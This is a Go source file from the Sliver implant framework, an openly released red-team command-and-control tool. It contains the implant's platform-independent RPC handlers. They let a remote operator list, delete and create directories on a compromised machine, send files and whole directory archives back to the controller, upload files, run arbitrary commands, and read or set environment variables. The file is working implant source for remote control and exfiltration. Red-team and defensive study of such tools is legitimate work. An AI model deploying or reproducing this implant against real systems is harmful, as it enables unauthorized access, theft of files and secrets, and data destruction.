package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os/exec"
	"strings"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"
	"path/filepath"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/golang/protobuf/proto"
)

// RPCResponse - Request/response callback
type RPCResponse func([]byte, error)

// RPCHandler - Request handler
type RPCHandler func([]byte, RPCResponse)

// SpecialHandler - Handlers that need to interact directly with the transport
type SpecialHandler func([]byte, *transports.Connection) error

// TunnelHandler - Tunnel related functionality for duplex connections
type TunnelHandler func(*sliverpb.Envelope, *transports.Connection)

// PivotHandler - Handler related to pivoting
type PivotHandler func(*sliverpb.Envelope, *transports.Connection)

// -----------------------------------------------------
// -----------------------------------------------------
// -----------------------------------------------------
// --- PURE GO / PLATFORM INDEPENDENT HANDLERS ONLY  ---
// -----------------------------------------------------
// -----------------------------------------------------
// -----------------------------------------------------

func pingHandler(data []byte, resp RPCResponse) {
	ping := &sliverpb.Ping{}
	err := proto.Unmarshal(data, ping)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("ping id = %d", ping.Nonce)
	// {{end}}
	data, err = proto.Marshal(ping)
	resp(data, err)
}

func dirListHandler(data []byte, resp RPCResponse) {
	dirListReq := &sliverpb.LsReq{}
	err := proto.Unmarshal(data, dirListReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}
	dir, files, err := getDirList(dirListReq.Path)

	// Convert directory listing to protobuf
	dirList := &sliverpb.Ls{Path: dir}
	if err == nil {
		dirList.Exists = true
	} else {
		dirList.Exists = false
	}
	dirList.Files = []*sliverpb.FileInfo{}
	for _, fileInfo := range files {
		dirList.Files = append(dirList.Files, &sliverpb.FileInfo{
			Name:  fileInfo.Name(),
			IsDir: fileInfo.IsDir(),
			Size:  fileInfo.Size(),
		})
	}

	// Send back the response
	data, err = proto.Marshal(dirList)
	resp(data, err)
}

func getDirList(target string) (string, []os.FileInfo, error) {
	dir, _ := filepath.Abs(target)
	if _, err := os.Stat(dir); !os.IsNotExist(err) {
		files, err := ioutil.ReadDir(dir)
		return dir, files, err
	}
	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
}

func rmHandler(data []byte, resp RPCResponse) {
	rmReq := &sliverpb.RmReq{}
	err := proto.Unmarshal(data, rmReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	rm := &sliverpb.Rm{}
	target, _ := filepath.Abs(rmReq.Path)
	rm.Path = target
	_, err = os.Stat(target)
	if err == nil {
		if (target == "/" || target == "C:\\") && !rmReq.Force {
			err = errors.New("Cowardly refusing to remove volume root without force")
		}
	}

	rm.Response = &commonpb.Response{}
	if err == nil {
		if rmReq.Recursive {
			err = os.RemoveAll(target)
			if err != nil {
				rm.Response.Err = err.Error()
			}
		} else {
			err = os.Remove(target)
			if err != nil {
				rm.Response.Err = err.Error()
			}
		}
	} else {
		rm.Response.Err = err.Error()
	}

	data, err = proto.Marshal(rm)
	resp(data, err)
}

func mkdirHandler(data []byte, resp RPCResponse) {
	mkdirReq := &sliverpb.MkdirReq{}
	err := proto.Unmarshal(data, mkdirReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	mkdir := &sliverpb.Mkdir{}
	target, _ := filepath.Abs(mkdirReq.Path)
	mkdir.Path = target

	err = os.MkdirAll(target, 0700)
	if err != nil {
		mkdir.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}
	data, err = proto.Marshal(mkdir)
	resp(data, err)
}

func cdHandler(data []byte, resp RPCResponse) {
	cdReq := &sliverpb.CdReq{}
	err := proto.Unmarshal(data, cdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	os.Chdir(cdReq.Path)
	dir, err := os.Getwd()
	pwd := &sliverpb.Pwd{Path: dir}
	if err != nil {
		resp([]byte{}, err)
		return
	}

	// {{if .Config.Debug}}
	log.Printf("cd '%s' -> %s", cdReq.Path, dir)
	// {{end}}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

func pwdHandler(data []byte, resp RPCResponse) {
	pwdReq := &sliverpb.PwdReq{}
	err := proto.Unmarshal(data, pwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	dir, err := os.Getwd()
	pwd := &sliverpb.Pwd{Path: dir}
	if err != nil {
		pwd.Response = &commonpb.Response{
			Err: err.Error(),
		}
	}

	data, err = proto.Marshal(pwd)
	resp(data, err)
}

// Send a file back to the hive
func downloadHandler(data []byte, resp RPCResponse) {
	var rawData []byte
	downloadReq := &sliverpb.DownloadReq{}
	err := proto.Unmarshal(data, downloadReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}
	target, _ := filepath.Abs(downloadReq.Path)
	fi, err := os.Stat(target)
	if err != nil {
		//{{if .Config.Debug}}
		log.Printf("stat failed on %s: %v", target, err)
		//{{end}}
		download := &sliverpb.Download{Path: target, Exists: false}
		download.Response = &commonpb.Response{
			Err: err.Error(),
		}
		data, err = proto.Marshal(download)
		resp(data, err)
		return
	}
	if fi.IsDir() {
		var dirData bytes.Buffer
		err = compressDir(target, &dirData)
		// {{if .Config.Debug}}
		log.Printf("error creating the archive: %v", err)
		// {{end}}
		rawData = dirData.Bytes()
	} else {
		rawData, err = ioutil.ReadFile(target)
	}

	var download *sliverpb.Download
	if err == nil {
		gzipData := bytes.NewBuffer([]byte{})
		gzipWrite(gzipData, rawData)
		download = &sliverpb.Download{
			Path:    target,
			Data:    gzipData.Bytes(),
			Encoder: "gzip",
			Exists:  true,
		}
	} else {
		download = &sliverpb.Download{Path: target, Exists: false}
		download.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}
	}

	data, _ = proto.Marshal(download)
	resp(data, err)
}

func uploadHandler(data []byte, resp RPCResponse) {
	uploadReq := &sliverpb.UploadReq{}
	err := proto.Unmarshal(data, uploadReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		resp([]byte{}, err)
		return
	}

	uploadPath, _ := filepath.Abs(uploadReq.Path)
	upload := &sliverpb.Upload{Path: uploadPath}
	f, err := os.Create(uploadPath)
	if err != nil {
		upload.Response = &commonpb.Response{
			Err: fmt.Sprintf("%v", err),
		}

	} else {
		defer f.Close()
		data, err := gzipRead(uploadReq.Data)
		if err != nil {
			upload.Response = &commonpb.Response{
				Err: fmt.Sprintf("%v", err),
			}
		} else {
			f.Write(data)
		}
	}

	data, _ = proto.Marshal(upload)
	resp(data, err)
}

func executeHandler(data []byte, resp RPCResponse) {
	var (
		err error
	)
	execReq := &sliverpb.ExecuteReq{}
	err = proto.Unmarshal(data, execReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	execResp := &sliverpb.Execute{}
	cmd := exec.Command(execReq.Path, execReq.Args...)

	if execReq.Output {
		res, err := cmd.CombinedOutput()
		//{{if .Config.Debug}}
		log.Println(string(res))
		//{{end}}
		if err != nil {
			// Exit errors are not a failure of the RPC, but of the command.
			if exiterr, ok := err.(*exec.ExitError); ok {
				execResp.Status = uint32(exiterr.ExitCode())
			} else {
				execResp.Response = &commonpb.Response{
					Err: fmt.Sprintf("%s", err),
				}
			}
		}
		execResp.Result = string(res)
	} else {
		err = cmd.Start()
		if err != nil {
			execResp.Response = &commonpb.Response{
				Err: fmt.Sprintf("%s", err),
			}
		}
	}
	data, err = proto.Marshal(execResp)
	resp(data, err)
}

func getEnvHandler(data []byte, resp RPCResponse) {
	envReq := &sliverpb.EnvReq{}
	err := proto.Unmarshal(data, envReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}
	variables := os.Environ()
	var envVars []*commonpb.EnvVar
	envInfo := sliverpb.EnvInfo{}
	if envReq.Name != "" {
		envVars = make([]*commonpb.EnvVar, 1)
		envVars[0] = &commonpb.EnvVar{
			Key:   envReq.Name,
			Value: os.Getenv(envReq.Name),
		}
	} else {
		envVars = make([]*commonpb.EnvVar, len(variables))
		for i, e := range variables {
			pair := strings.SplitN(e, "=", 2)
			envVars[i] = &commonpb.EnvVar{
				Key:   pair[0],
				Value: pair[1],
			}
		}
	}
	envInfo.Variables = envVars
	data, err = proto.Marshal(&envInfo)
	resp(data, err)
}

func setEnvHandler(data []byte, resp RPCResponse) {
	envReq := &sliverpb.SetEnvReq{}
	err := proto.Unmarshal(data, envReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v\n", err)
		// {{end}}
		return
	}

	err = os.Setenv(envReq.Variable.Key, envReq.Variable.Value)
	setEnvResp := &sliverpb.SetEnv{
		Response: &commonpb.Response{},
	}
	if err != nil {
		setEnvResp.Response.Err = err.Error()
	}
	data, err = proto.Marshal(setEnvResp)
	resp(data, err)
}

// ---------------- Data Encoders ----------------

func gzipWrite(w io.Writer, data []byte) error {
	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
	defer gw.Close()
	gw.Write(data)
	return err
}

func gzipRead(data []byte) ([]byte, error) {
	bytes.NewReader(data)
	reader, _ := gzip.NewReader(bytes.NewReader(data))
	var buf bytes.Buffer
	_, err := buf.ReadFrom(reader)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func compressDir(path string, buf io.Writer) error {
	zipWriter := gzip.NewWriter(buf)
	tarWriter := tar.NewWriter(zipWriter)

	filepath.Walk(path, func(file string, fi os.FileInfo, err error) error {
		fileName := file
		// If the file is a SymLink replace fileInfo and path with the symlink destination.
		if fi.Mode()&os.ModeSymlink == os.ModeSymlink {
			file, err = filepath.EvalSymlinks(file)
			if err != nil {
				return err
			}

			fi, err = os.Lstat(file)
			if err != nil {
				return err
			}
		}
		header, err := tar.FileInfoHeader(fi, file)
		if err != nil {
			return err
		}
		// Keep the symlink file path for the header name.
		header.Name = filepath.ToSlash(fileName)
		if err := tarWriter.WriteHeader(header); err != nil {
			return err
		}
		if !fi.IsDir() {
			data, err := os.Open(file)
			if err != nil {
				return err
			}
			if _, err := io.Copy(tarWriter, data); err != nil {
				return err
			}
		}
		return nil
	})
	if err := tarWriter.Close(); err != nil {
		return err
	}
	if err := zipWriter.Close(); err != nil {
		return err
	}
	return nil
}
